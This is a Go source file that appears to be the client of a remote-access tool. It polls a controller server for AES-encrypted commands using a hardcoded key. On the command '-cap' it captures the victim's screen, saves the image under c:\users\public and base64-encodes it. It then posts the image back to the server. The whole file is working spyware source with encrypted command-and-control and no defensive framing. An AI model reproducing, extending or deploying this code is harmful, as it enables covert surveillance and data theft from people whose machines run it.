package main

import (
	"carga14/helpers"
	"carga14/methods"
	"encoding/base64"
	"fmt"
	aesgo "github.com/3xploit666/AesGo"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

var (
	Url    = "http://localhost:9090/main"
	Pic    = "http://localhost:9090/pic"
	Client = http.Client{}
)

const key = "5345435454535"

func Getcomandos() {

	req, err := http.NewRequest("GET", Url, nil)
	if err != nil {
		log.Fatal(err)
	}
	res, err := Client.Do(req)
	//methods.Sendpost(Url2, Recolect.GetOS())

	if err != nil {
		log.Fatal(res)
	}
	defer res.Body.Close()

	body, _ := ioutil.ReadAll(res.Body)
	var dec = aesgo.DecryptAes(string(body), key)
	if strings.Contains(dec, "-cap") {

		var aa = "tomando captura"
		enc2 := aesgo.EncryptAes(string(aa), key)
		err := methods.Sendpost(Url, enc2)
		if err != nil {
			return
		}
		helpers.GetScreenshot()

		leer, err := ioutil.ReadFile("c:\\users\\public\\fotos.png")
		if err != nil {
			fmt.Println(err)
		}

		var enco = base64.StdEncoding.EncodeToString(leer)
		methods.Sendpost(Pic, enco)
	}
}

func main() {
	const espera time.Duration = 3
	Getcomandos()
	time.Sleep(espera * time.Second)
}
